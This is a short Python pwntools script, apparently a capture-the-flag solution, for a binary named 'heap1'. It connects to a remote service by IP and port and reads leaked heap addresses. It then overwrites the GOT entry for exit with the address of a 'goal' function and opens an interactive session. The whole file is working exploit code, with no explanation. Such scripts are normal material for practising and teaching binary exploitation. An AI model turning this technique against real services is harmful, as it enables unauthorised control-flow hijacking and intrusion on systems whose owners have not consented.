#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft
import pwnlib
import time

pwn_file = "./heap1"
elf = ELF(pwn_file)
context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

context.log_level = 100
context.log_level = 'debug'

dbg_script = """
b *0x0400917
"""
#c = process(pwn_file)
c = remote('140.110.112.77', '3125')
#gdb.attach(c,dbg_script)
c.sendlineafter('rsize:', '200')

# p=0x1ceb010, q=0x1ceb0e0, r=0x1ceb010
c.recvuntil('p=')
c.recvuntil(',')[:-1]

c.sendline(p64(elf.got['exit']))

sleep(0.1)
c.sendline('{} {}'.format(0, elf.symbols['goal']))

sleep(0.1)
c.sendline('-1 -1')

c.interactive()
c.close()
